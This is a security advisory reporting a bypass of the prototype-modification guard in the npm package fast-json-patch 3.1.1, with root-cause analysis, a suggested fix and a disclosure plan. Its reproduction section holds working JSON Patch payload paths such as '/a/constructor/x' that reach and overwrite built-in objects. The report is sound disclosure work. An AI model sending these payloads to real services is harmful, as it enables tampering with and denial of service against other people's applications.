# `banPrototypeModifications` bypass in fast-json-patch 3.1.1

**Package**: `fast-json-patch` (npm)
**Repository**: https://github.com/Starcounter-Jack/JSON-Patch
**Version tested**: 3.1.1 (latest, published 2022-03-24; verified 2026-11-05)
**Category**: CWE-693 (protection mechanism failure) / CWE-1321 (prototype pollution)
**Reported by**: independent security research

---

## 1. Summary

`fast-json-patch` provides an option `banPrototypeModifications` (**enabled by default**) that is documented to prevent modification of `__proto__` and `constructor/prototype`. The check is a **pattern match on path segments**:

```js
// commonjs/core.js:191
if (banPrototypeModifications &&
    (key == '__proto__' ||
        (key == 'prototype' && t > 0 && keys[t - 1] == 'constructor'))) {
    throw new TypeError('JSON-Patch: modifying `__proto__` or `constructor/prototype` prop is banned ...');
}
```

The pattern does not cover `constructor` alone, `constructor/constructor`, or `constructor/<anything>`. Both the read and the write path reach built-in objects through that gap.

Since RFC 6902 requires the `path` member of every operation to come from the client, **the path is attacker-controlled by protocol design** in any service that applies a patch document received over the network.

---

## 2. Reproduction (Node v22.22.2, fast-json-patch 3.1.1)

```js
const jsonpatch = require('fast-json-patch');

// --- control: normal pointer resolution still works ---
jsonpatch.getValueByPointer({ a: { b: 7 } }, '/a/b');            // => 7

// --- control: the guard does fire on the paths it enumerates ---
jsonpatch.applyPatch({ a: {} }, [{ op: 'add', path: '/__proto__/x', value: 1 }]);
// => TypeError: JSON-Patch: modifying `__proto__` or `constructor/prototype` prop is banned

// --- A. read: reach the Function constructor (guard enabled) ---
jsonpatch.getValueByPointer({}, '/constructor/constructor');
// => [Function: Function]

// --- B. write: mutate a built-in through the same gap ---
jsonpatch.applyPatch({ a: {} }, [{ op: 'add', path: '/a/constructor/x', value: 'INJECTED' }]);
// => Object.x === 'INJECTED'   (global, visible to the whole process)

jsonpatch.applyPatch({ a: {} }, [{ op: 'replace', path: '/a/constructor/constructor', value: 'PWNED' }]);
// => Object.constructor === 'PWNED'
```

Observed output of our harness (Node v22.22.2):

```
[PASS] fjp.control        -> 7
[PASS] fjp.guard_proto    -> blocked: JSON-Patch: modifying `__proto__` or `constructor/
[HIT ] fjp.read_bypass    -> function
[HIT ] fjp.write_bypass   -> Object.x=INJECTED
```

`getValueByPointer` is not a separate code path: it fabricates an `_get` operation and re-enters `applyOperation`, so the same guard — and the same gap — governs reads.

---

## 3. Root cause

The guard enumerates **specific segment patterns** instead of asking whether the segment is an **own** property of the node being traversed.

`constructor` is inherited from `Object.prototype`, so `{}['constructor']` is `Object`; a second `constructor` yields `Function`. The traversal loop then happily continues into built-ins.

This cannot be fixed by extending the list: `valueOf`, `toLocaleString`, `__defineGetter__`, `isPrototypeOf`, `propertyIsEnumerable` and any future addition to `Object.prototype` are equally inherited and equally reachable. The denylist would have to be kept in sync with the language itself.

---

## 4. Impact — and what we did NOT demonstrate

| Direction | Reachable | Consequence |
|---|---|---|
| Read (`test`, `getValueByPointer`) | `Function` constructor | If the caller passes the resolved value to a function call, this becomes arbitrary code execution. **The library itself never calls it.** |
| Write (`add`, `replace`, `remove`) | own properties of `Object` / `Function` | Global namespace tampering from a data-only document. The documented guarantee of `banPrototypeModifications` does not hold. |

Boundaries we explicitly did **not** cross:

- We did **not** demonstrate exploitation inside a downstream application.
- JSON values cannot carry functions, so the write path alone does **not** give code execution — it gives integrity loss and process-level denial of service (e.g. overwriting `Object.assign`).
- The read path escalates only if the application treats the returned value as callable.

Suggested CVSS 3.1 (library-level, read-side escalation assumed plausible):
`AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:H` = **8.6**.
If the maintainers consider the read side non-exploitable without a sink,
`AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L` = **7.5** is the conservative floor.

---

## 5. Suggested fix

Replace the pattern match with an ownership check at the point where the loop descends:

```js
if (!Object.hasOwnProperty.call(obj, key)) {
    throw new JsonPatchError(
        'Path not found in document', 'OPERATION_PATH_UNRESOLVED',
        index, operation, document
    );
}
```

`obj[key]` is then guarded **structurally** rather than syntactically, and the denylist can be retired. This is the approach taken by the `jsonpatch` package (`JSONPointer.prototype.get` → `Object.hasOwnProperty.call(node, lastSegment)`), which resisted all seven payloads we tested while remaining RFC 6902 compliant.

If compatibility requires keeping the option, apply the ownership check only when `banPrototypeModifications` is true.

---

## 6. Affected range

Verified on **3.1.1** only. The guard text has been present since `banPrototypeModifications` was introduced, so earlier 3.x and 2.x releases are likely affected — **please confirm from git history rather than from this claim**.

Not affected by this specific gap (verified): `__proto__`-based paths and `constructor/prototype` pairs, which the guard does block.

---

## 7. Disclosure

- This report is submitted privately first; no public issue will be opened before a fix or 45 days, whichever comes first.
- No downstream application was tested; no user data was accessed.
- Happy to provide the full harness (`verify_local.js`) or re-test against a patched build.
